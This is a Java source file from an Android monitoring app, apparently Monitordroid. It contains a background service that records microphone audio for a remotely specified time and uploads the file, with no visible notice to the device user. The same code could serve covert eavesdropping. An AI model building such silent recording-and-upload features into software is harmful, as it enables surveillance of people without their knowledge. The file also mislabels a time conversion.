/**
 * Copyright (C) 2015 Monitordroid Inc.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * @author Tyler Butler
 **/

package com.monitordroid.app;

import java.io.File;
import java.io.IOException;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.AsyncTask;
import android.os.Environment;
import android.os.IBinder;

public class SoundRecorder extends Service {

	final MediaRecorder recorder = new MediaRecorder();
	double time;
	String path = "";
	boolean isRecording = false;

	/**
	 * When the service is initially started, extract the desired minutes to
	 * record sound from the intent
	 */
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		int timeMS = (Integer) intent.getExtras().get("recordTime");
		if (!isRecording) {
			try {
				start(this, timeMS);
			}
			catch (IOException e) {

			}
		}
		return START_NOT_STICKY;
	}

	/**
	 * Starts a new recording
	 * 
	 * @param timeMS
	 *            Time (in milliseconds) to record
	 * @throws IOException
	 *             thrown when sound file cannot be output into the intended
	 *             directory
	 */
	public void start(Context context, int timeMS) throws IOException {

		// First check to see if the MediaRecorder is already recording. If it
		// is and it attempts to start, it will cause an IllegalStateException.
		// Convert milliseconds to minutes
		int time = (timeMS * 1000 * 60);
		String state = android.os.Environment.getExternalStorageState();
		if (!state.equals(android.os.Environment.MEDIA_MOUNTED)) {
			throw new IOException("SD Card is not mounted.  It is " + state
					+ ".");
		}

		// make sure the directory we plan to store the recording in exists
		path = Environment.getExternalStorageDirectory().toString()
				+ "/sound.m4a";
		File directory = new File(path).getParentFile();
		if (!directory.exists() && !directory.mkdirs()) {
			throw new IOException("Path to file could not be created.");
		}
		recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
		recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
		recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);

		// Max recording size: 3.0MB
		recorder.setMaxFileSize(3000000);
		recorder.setOutputFile(path);
		recorder.prepare();
		recorder.start();
		isRecording = true;
		MyAsyncTask task = new MyAsyncTask(context);
		task.execute(time);
	}

	/**
	 * Stops a recording that has been previously started.
	 */
	public void stop(Context context) throws IOException {
		if (isRecording) {
			recorder.stop();
			recorder.release();
			isRecording = false;
			UploadFile uf = new UploadFile();
			File recording = new File(Environment.getExternalStorageDirectory()
					.toString() + "/sound.m4a");
			uf.uploadFile(context, recording, true);
			stopSelf();
		}
	}

	@Override
	public void onDestroy() {
		try {
			if (isRecording) {
				stop(this);
			}
		}
		catch (IOException e) {

		}
		super.onDestroy();
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	/**
	 * Sleeps for the amount of time the recording is supposed to last, and when
	 * complete calls the method to stop recording
	 */
	public class MyAsyncTask extends AsyncTask<Integer, Void, Void> {
		private Context mContext;

		public MyAsyncTask(Context context) {
			mContext = context;
		}

		@Override
		protected Void doInBackground(Integer... params) {
			try {
				int sleepTime = params[0];
				Thread.sleep(sleepTime);
			}
			catch (InterruptedException e) {
			}
			return null;
		}

		@Override
		protected void onPostExecute(Void result) {
			try {
				stop(mContext);
			}
			catch (IOException e) {

			}
		}
	};
}
